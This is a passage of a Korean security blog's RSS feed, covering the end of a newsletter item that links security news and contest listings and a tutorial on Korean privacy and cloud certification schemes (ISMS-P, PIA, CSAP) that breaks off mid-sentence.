alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xB514;&#xC988;&#xB2C8;&#xB97C; &#xD574;&#xD0B9;&#xD55C; &#xC870;&#xC9C1;&#xC740; NullBulge&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC5B4;&#xC694;.</p><p>NullBulge&#xB294; &#xCD5C;&#xADFC; &#xBA87; &#xC8FC; &#xB3D9;&#xC548; &#xB514;&#xC988;&#xB2C8;&#xC758; &#xC2AC;&#xB799; &#xCC44;&#xB110;&#xC5D0;&#xC11C; &#xC5BB;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xC8FC;&#xC7A5;&#xD558;&#xB294; &#xBB38;&#xC11C;&#xC758; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC744; &#xC628;&#xB77C;&#xC778;&#xC5D0; &#xAC8C;&#xC2DC;&#xD588;&#xC73C;&#xBA70;, &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC124;&#xBA85;, &#xACC4;&#xD68D;, &#xB514;&#xC988;&#xB2C8;&#xB79C;&#xB4DC; &#xD30C;&#xB9AC;&#xC758; &#xBC29;&#xBB38;&#xAC74;, &#xC608;&#xC57D;&#xB7;&#xC218;&#xC775; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xC5B4;&#xC694; &#x1FAE3;  </p><p><a href="https://nullbulge.se/blog.html">&#xB9C1;&#xD06C;</a>&#xC5D0;&#xC11C; NullBulge&#xAC00; &#xACF5;&#xAC1C;&#xD55C; &#xAE00;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;!</p><p><a href="https://m.youtube.com/watch?v=ZGScvWIyw2E">&#xC601;&#xC0C1;</a>&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?  &#x1F440;</p><h2 id="&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;"><a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;" class="headerlink" title="&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C; &#xBB3C;&#xC5B4;&#xBD10; "></a>&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C; &#xBB3C;&#xC5B4;&#xBD10; <img src="/img/keyword.gif" width="30" height="30" style="float:left;"></h2><p><strong>BSOD</strong></p><p>Blue Screen of Death, &#xC708;&#xB3C4;&#xC6B0; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#xB098;&#xD0C0;&#xB098;&#xB294; &#xD654;&#xBA74;</p><h3 id="&#xC9C0;&#xC2DD;-PLUS-&#x2795;"><a href="#&#xC9C0;&#xC2DD;-PLUS-&#x2795;" class="headerlink" title="&#xC9C0;&#xC2DD; PLUS &#x2795;"></a>&#xC9C0;&#xC2DD; PLUS &#x2795;</h3><p><a href="https://m.boannews.com/html/detail.html?tab_type=1&amp;idx=131370">&#xC0AC;&#xACE0;&#xB85C; &#xC720;&#xCD9C; &#xB41C; &#xAE43;&#xD5C8;&#xBE0C; &#xD1A0;&#xD070;</a></p><p><a href="https://m.boannews.com/html/detail.html?tab_type=1&amp;idx=131437">&#xB0B4; &#xC190;&#xC73C;&#xB85C; &#xD53C;&#xC2F1; &#xD30C;&#xC77C; &#xC2E4;&#xD589;? &#xBD99;&#xC5EC;&#xB123;&#xAE30;&#xB85C; &#xAC10;&#xC5FC;&#xB418;&#xB294; &#xB2E4;&#xD06C;&#xAC8C;&#xC774;&#xD2B8; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC720;&#xD3EC;</a></p><p><a href="https://m.boannews.com/html/detail.html?tab_type=1&amp;idx=131329">&#xC628;&#xB77C;&#xC778; &#xAC15;&#xC758; &#xD50C;&#xB7AB;&#xD3FC; &#x2018;&#xD074;&#xB798;&#xC2A4;&#xC720;&#x2019;, &#xD68C;&#xC6D0; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xB300;&#xAC70; &#xC720;&#xCD9C;</a></p><h2 id="7&#xC6D4;-&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;-&#xB300;&#xD68C;-&#x1F425;"><a href="#7&#xC6D4;-&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;-&#xB300;&#xD68C;-&#x1F425;" class="headerlink" title="7&#xC6D4; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; | &#xB300;&#xD68C; &#x1F425;"></a><strong>7&#xC6D4; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; | &#xB300;&#xD68C;</strong> &#x1F425;</h2><p><a href="https://cryptocontest.kr/challenge/">&#xC554;&#xD638;&#xBD84;&#xC11D;&#xACBD;&#xC9C4;&#xB300;&#xD68C;</a> | &#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xD559;&#xD68C; | ~24.08.31 </p><p><a href="http://www.itdaily.kr/news/articleView.html?idxno=223547">&#xAE08;&#xC735;&#xAD8C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810; &#xC2E0;&#xACE0;&#xD3EC;&#xC0C1;&#xC81C; (&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;)</a> | &#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0; | ~24.08.31</p><p><a href="https://iscr.cyber.go.kr/">&#xAD6D;&#xC81C; &#xC0AC;&#xC774;&#xBC84;&#xBC94;&#xC8C4;&#xB300;&#xC751; &#xC2EC;&#xD3EC;&#xC9C0;&#xC5C4;</a> | &#xACBD;&#xCC30;&#xCCAD; | 24.07.01 &#xC0AC;&#xC804; &#xB4F1;&#xB85D; &#xC2DC;&#xC791; (24.08.27 ~ 24.08.29)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Newsletter/">Newsletter</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newsletter/">newsletter</category>
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/22/clalxk/newsletter0722/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Part2. 국내 보안 인증제도- 개인정보보호 &amp; 클라우드</title>
      <link>https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/</link>
      <guid>https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/</guid>
      <pubDate>Sun, 21 Jul 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2024/07/21/romi0x/certification_privacy/privacy_certification_index.png&quot; alt=&quot;&amp;#xC0AC;&amp;#xC9C4;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD55</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2024/07/21/romi0x/certification_privacy/privacy_certification_index.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! romi0x&#xC785;&#xB2C8;&#xB2E4; &#x1F600;</p><p>&#xC624;&#xB298;&#xC740; &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xC81C;&#xB3C4;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC18C;&#xAC1C;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD574;&#xC694;!</p><p>&#xC800;&#xBC88;&#xC5D4; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD24;&#xC8E0;!</p><p><a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">Part1. &#xAD6D;&#xB0B4; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;&#xB3C4;- &#xC815;&#xBCF4;&#xBCF4;&#xD638;</a></p><p>&#xC774;&#xBC88;&#xC5D4; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xC640; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;~!!</p><p><img src="/2024/07/21/romi0x/certification_privacy/image1.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xC774;&#xBC88; &#xD3B8;&#xC740; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC640; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB904;&#xBCFC;&#xAC8C;&#xC694;!</p><ul><li><p>&#xAC1C;&#xC778;&#xC815;&#xBCF4;</p><ol><li><strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xBC0F; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;(ISMS-P)</strong></li><li><p><strong>&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;(PIA)</strong></p><p><img src="/2024/07/21/romi0x/certification_privacy/image2.png" alt="&#xC0AC;&#xC9C4;"></p></li></ol></li><li><p>&#xD074;&#xB77C;&#xC6B0;&#xB4DC;</p><ol><li><p><strong>&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;(CSAP, Cloud Security Assurance Program)</strong></p><p><img src="/2024/07/21/romi0x/certification_privacy/image3.png" alt="&#xC0AC;&#xC9C4;"></p></li></ol></li></ul><h2 id="&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;"><a href="#&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;" class="headerlink" title="&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;"></a>&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;</h2><h3 id="1&#xFE0F;&#x20E3;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xBC0F;-&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xAD00;&#xB9AC;&#xCCB4;&#xACC4;-&#xC778;&#xC99D;-ISMS-P"><a href="#1&#xFE0F;&#x20E3;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xBC0F;-&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xAD00;&#xB9AC;&#xCCB4;&#xACC4;-&#xC778;&#xC99D;-ISMS-P" class="headerlink" title="1&#xFE0F;&#x20E3; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xBC0F; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;(ISMS-P)"></a>1&#xFE0F;&#x20E3; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xBC0F; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;(ISMS-P)</h3><p><img src="/2024/07/21/romi0x/certification_privacy/image4.png" alt="&#xC0AC;&#xC9C4;"></p><p><strong>ISMS-P&#xB294; &#xAE30;&#xC874;&#xC758; ISMS&#xC640; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xD56D;&#xBAA9;&#xC774; &#xD569;&#xCCD0;&#xC9C4; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.<br>ISMS&#xC640; &#xACB9;&#xCE58;&#xB294; &#xB0B4;&#xC6A9;&#xC740; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xC0C8;&#xB86D;&#xAC8C; &#xCD94;&#xAC00;&#xB41C; &#xB0B4;&#xC6A9;&#xB9CC; &#xB2E4;&#xB8F9;&#xB2C8;&#xB2E4;.</strong></p><p><strong>ISMS&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xAD81;&#xAE08;&#xD558;&#xB2E4;&#xBA74; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">&#xB9C1;&#xD06C;</a>&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</strong></p><ul><li>&#xC815;&#xC758;<ul><li><strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xBC0F; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;</strong>&#xB85C;, ISMS-P&#xB77C;&#xACE0; &#xBD88;&#xB9AC;&#xB294; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</li><li>ISMS-P &#xC778;&#xC99D;&#xC740; &#xAE30;&#xC5C5;&#xC774; <strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC640; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;</strong>&#xB97C; &#xC704;&#xD574; &#xD544;&#xC694;&#xD55C; &#xBAA8;&#xB4E0; &#xC870;&#xCE58;&#xB97C; &#xCCB4;&#xACC4;&#xC801;&#xC774;&#xACE0; &#xC77C;&#xAD00;&#xB418;&#xAC8C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xC5C5;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xC810;&#xC744; &#xC5BB;&#xACE0;, &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC640; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB97C; &#xC704;&#xD55C; &#xC9C0;&#xC18D;&#xC801;&#xC778; &#xAC1C;&#xC120;&#xACFC; &#xBC1C;&#xC804;&#xC744; &#xB3C4;&#xBAA8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xC778;&#xC99D; &#xCD94;&#xC9C4; &#xAE30;&#xAD00;</p><p><em>ISMS&#xC640; &#xB3D9;&#xC77C;</em></p></li><li><p>&#xAD00;&#xB828; &#xBC95;&#xB839;</p><p>&#xAE30;&#xC874; ISMS &#xBC95;&#xB839;&#xACFC; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xBC95;&#xC774; &#xD569;&#xCCD0;&#xC838; ISMS-P &#xBC95;&#xC801;&#xADFC;&#xAC70;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>ISMS &#xAD00;&#xB828; &#xBC95;&#xB839;<ul><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC81C;47&#xC870;</li><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC2DC;&#xD589;&#xB839; &#xC81C;47&#xC870;~&#xC81C;54&#xC870;</li><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC2DC;&#xD589;&#xADDC;&#xCE59; &#xC81C;3&#xC870;</li></ul></li><li>ISMS-P &#xAD00;&#xB828; &#xBC95;&#xB839;<ul><li>&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xBC95; &#xC81C;32&#xC870;&#xC758;2 </li><li>&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xBC95; &#xC2DC;&#xD589;&#xB839; &#xC81C;34&#xC870;&#xC758;2~&#xC81C;34&#xC870;&#xC758;8</li><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xBC0F; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D; &#xB4F1;&#xC5D0; &#xAD00;&#xD55C; &#xACE0;&#xC2DC;</li></ul></li></ul></li></ul><ul><li><p>&#xC778;&#xC99D; &#xB300;&#xC0C1;</p><p><em>ISMS&#xC640; &#xB3D9;&#xC77C;</em></p><p>ISMS&#xC640; &#xC778;&#xC99D; &#xB300;&#xC0C1;&#xC740; &#xB3D9;&#xC77C;&#xD558;&#xB098; &#xB300;&#xC0C1;&#xC790;&#xC758; &#xC810;&#xAC80; &#xD56D;&#xBAA9;&#xC5D0;&#xC11C; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xD56D;&#xBAA9;&#xC774; &#xC788;&#xB2E4;&#xBA74; <strong>&#xD3C9;&#xAC00;&#xC2DC; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xD56D;&#xBAA9; &#xC778;&#xC99D;&#xC774; &#xB3D9;&#xC2DC;&#xC5D0; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</strong></p></li><li><p>&#xD3C9;&#xAC00; &#xC808;&#xCC28;</p><p><em>ISMS&#xC640; &#xB3D9;&#xC77C;</em></p></li><li><p>&#xC778;&#xC99D; &#xAE30;&#xC900;</p><p><img src="/2024/07/21/romi0x/certification_privacy/image5.png" alt="&#xC0AC;&#xC9C4;"></p><p><a href="https://isms.kisa.or.kr/main/ispims/intro/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p><p>ISMS-P&#xC758; &#xACBD;&#xC6B0; &#xAE30;&#xC874;&#xC758; ISMS &#xC778;&#xC99D;&#xAE30;&#xC900;&#xC778;  &#x2018;<strong>&#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC218;&#xB9BD; &#xBC0F; &#xC6B4;&#xC601;</strong>&#x2019; &#xACFC; &#x2018;<strong>&#xBCF4;&#xD638;&#xB300;&#xCC45; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;</strong>&#x2019;&#xC640; ISMS-P&#xC758; &#xC778;&#xC99D;&#xAE30;&#xC900;&#xC778; &#x2018;<strong>&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xCC98;&#xB9AC;&#xB2E8;&#xACC4;&#xBCC4; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;</strong>&#x2019;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2024/07/21/romi0x/certification_privacy/010.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xAD04;&#xD638; &#xC548;&#xC5D0; &#xC22B;&#xC790;&#xB294; &#xC778;&#xC99D;&#xAE30;&#xC900; &#xAC1C;&#xC218;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xC694;.</p><p><a href="https://isms.kisa.or.kr/main/ispims/notice/?boardId=bbs_0000000000000014&amp;mode=view&amp;cntId=21">3&#xAC00;&#xC9C0; &#xC778;&#xC99D;&#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCD1D; 80&#xAC1C;&#xC758; &#xC778;&#xC99D;&#xAE30;&#xC900;&#xC774; &#xC788;&#xC5B4;&#xC694;.</a></p></li></ul><ul><li><p>&#xC778;&#xC99D; &#xD61C;&#xD0DD;</p><p><em>ISMS&#xC640; &#xB3D9;&#xC77C;</em></p></li></ul><h3 id="2&#xFE0F;&#x20E3;-&#xAC1C;&#xC778;&#xC815;&#xBCF4;-&#xC601;&#xD5A5;&#xD3C9;&#xAC00;-PIA"><a href="#2&#xFE0F;&#x20E3;-&#xAC1C;&#xC778;&#xC815;&#xBCF4;-&#xC601;&#xD5A5;&#xD3C9;&#xAC00;-PIA" class="headerlink" title="2&#xFE0F;&#x20E3; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;(PIA)"></a>2&#xFE0F;&#x20E3; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;(PIA)</h3><p><img src="/2024/07/21/romi0x/certification_privacy/image6.png" alt="&#xC0AC;&#xC9C4;"></p><ul><li>&#xC815;&#xC758;<ul><li>&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xD30C;&#xC77C;&#xC758; &#xC2E0;&#xADDC; &#xB3C4;&#xC785;&#xB7;&#xBCC0;&#xACBD; &#xC2DC; &#xC704;&#xD5D8;&#xC694;&#xC778; &#xBD84;&#xC11D; &#xBC0F; &#xAC1C;&#xC120; &#xC0AC;&#xD56D;&#xC744; &#xB3C4;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD558;&#xC5EC; <strong>&#xC0AC;&#xC804;&#xC5D0; &#xC870;&#xC0AC; &#xBD84;&#xC11D;&#xB7;&#xD3C9;&#xAC00;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC81C;&#xB3C4;</strong>&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xC778;&#xC99D; &#xCD94;&#xC9C4; &#xAE30;&#xAD00;</p><p>ISMS &#xC778;&#xC99D; &#xCCB4;&#xACC4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xAE30;&#xAD00;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p>  <table>    <tr>      <td>&#xC815;&#xCC45;&#xAE30;&#xAD00;</td>      <td>        <a href="https://www.msit.go.kr/">&#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;</a><br>        <a href="https://www.pipc.go.kr/">&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC704;&#xC6D0;&#xD68C;</a>      </td>    </tr>    <tr>      <td>&#xC778;&#xC99D;&#xAE30;&#xAD00;</td>      <td>        <a href="https://www.kisa.or.kr/">&#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA)</a><br>        <a href="https://www.fsec.or.kr/">&#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0;(FSEC)</a>      </td>    </tr>    <tr>      <td>&#xC2EC;&#xC0AC;&#xAE30;&#xAD00;</td>      <td>        <a href="https://www.kait.or.kr/">&#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xC9C4;&#xD765;&#xD611;&#xD68C;(KAIT)</a><br>        <a href="https://www.tta.or.kr/">&#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xAE30;&#xC220;&#xD611;&#xD68C;(TTA)</a><br>        <a href="https://www.opa.or.kr/">&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xD611;&#xD68C;(OPA)</a><br>        &#xCC28;&#xC138;&#xB300;&#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC6D0;(NISC)      </td>    </tr>  </table></li><li><p>&#xAD00;&#xB828; &#xBC95;&#xB839;</p><ul><li>&#x300C;&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638;&#xBC95;&#x300D; &#xC81C;33&#xC870;(&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;)</li></ul></li><li><p>&#xD3C9;&#xAC00; &#xB300;&#xC0C1;</p><p>  <strong>&#xACF5;&#xACF5;&#xAE30;&#xAD00;</strong>&#xC774; &#xAD6C;&#xCD95;&#x2027;&#xC6B4;&#xC6A9;&#x2027;&#xBCC0;&#xACBD;&#xD558;&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xD30C;&#xC77C; &#xC911;&#xC5D0; &#xC544;&#xB798;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xD30C;&#xC77C;&#xC5D0; &#xD55C;&#xD558;&#xC5EC; <strong>&#xC601;&#xD5A5;&#xD3C9;&#xAC00;&#xB97C; &#xC758;&#xBB34;&#xD654;</strong> &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  &#xD3C9;&#xAC00; &#xB300;&#xC0C1;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; <a href="https://www.privacy.go.kr/front/per/iass/duty/effectsEvalutionDuty.do">&#xB9C1;&#xD06C;</a>&#xC744; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;</p><ul><li><strong>&#xC758;&#xBB34; &#xB300;&#xC0C1;&#xC790;</strong><br><img src="/2024/07/21/romi0x/certification_privacy/011.png" alt="&#xC0AC;&#xC9C4;"></li></ul></li></ul><ul><li><p>&#xCC98;&#xB9AC;&#xC808;&#xCC28;&amp;&#xD3C9;&#xAC00;&#xC808;&#xCC28;</p><ul><li><p>&#xCC98;&#xB9AC;&#xC808;&#xCC28;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;. </p><p>&#xD3C9;&#xAC00;&#xB97C; &#xC704;&#xD55C; &#xD070; &#xCC98;&#xB9AC; &#xC808;&#xCC28;&#xC785;&#xB2C8;&#xB2E4;. </p><p>  <strong>&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;&#xC5D0; &#xAD00;&#xD55C; &#xACE0;&#xC2DC;</strong> &#xC81C;12&#xC870;(&#xC601;&#xD5A5;&#xD3C9;&#xAC00;&#xC11C;&#xC758; &#xC81C;&#xCD9C;) </p><p>  &#xC601; &#xC81C;38&#xC870;&#xC81C;2&#xD56D;&#xC5D0; &#xB530;&#xB77C; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;&#xC11C;&#xB97C; &#xC81C;&#xCD9C;&#xBC1B;&#xC740; &#xB300;&#xC0C1;&#xAE30;&#xAD00;&#xC758; &#xC7A5;&#xC740; <strong>2&#xAC1C;&#xC6D4; &#xC774;&#xB0B4;&#xC5D0;</strong> &#xD3C9;&#xAC00;&#xACB0;&#xACFC;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xBD80;&#xC2B9;&#xC778; &#xC808;&#xCC28;&#xB97C; &#xAC70;&#xCCD0; &#xC601;&#xD5A5;&#xD3C9;&#xAC00;&#xC11C; &#xBC0F; &#xADF8; &#xC694;&#xC57D;&#xBCF8;(&#xC694;&#xC57D;&#xBCF8;&#xC744; &#xACF5;&#xAC1C;&#xD558;&#xB824;&#xB294; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xC694;&#xC57D;&#xBCF8;&#xC744; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;)&#xC744; &#xBCF4;&#xD638;&#xC704;&#xC6D0;&#xD68C;&#xC5D0; &#xC81C;&#xCD9C;&#xD574;&#xC57C;&#xD574;&#xC694;.<br><img src="/2024/07/21/romi0x/certification_privacy/image7.png" alt="&#xC0AC;&#xC9C4;"><br><a href="https://www.pipc.go.kr/np/default/page.do?mCode=D050020000">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p></li></ul><ul><li><p>&#xD3C9;&#xAC00;&#xC808;&#xCC28;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><p>&#xC5EC;&#xAE30;&#xC11C;, &#xC601;&#xD5A5;&#xD3C9;&#xAC00;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xAD6C;&#xCD95;&#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#x2018;<strong>&#xBD84;&#xC11D;&#x2022;&#xC124;&#xACC4;&#x2019; &#xB2E8;&#xACC4;</strong>&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xC810;!!<br><img src="/2024/07/21/romi0x/certification_privacy/image8.png" alt="&#xC0AC;&#xC9C4;"></p></li></ul></li><li><p>&#xD3C9;&#xAC00;&#xD56D;&#xBAA9;</p><p>  &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xCE68;&#xD574;&#xC694;&#xC778; &#xBD84;&#xC11D;&#xC744; &#xC704;&#xD55C; &#xD3C9;&#xAC00; &#xD56D;&#xBAA9;&#xC740; <strong>5&#xAC1C;&#xC758; &#xD3C9;&#xAC00;&#xC601;&#xC5ED;, 25&#xAC1C;&#xC758; 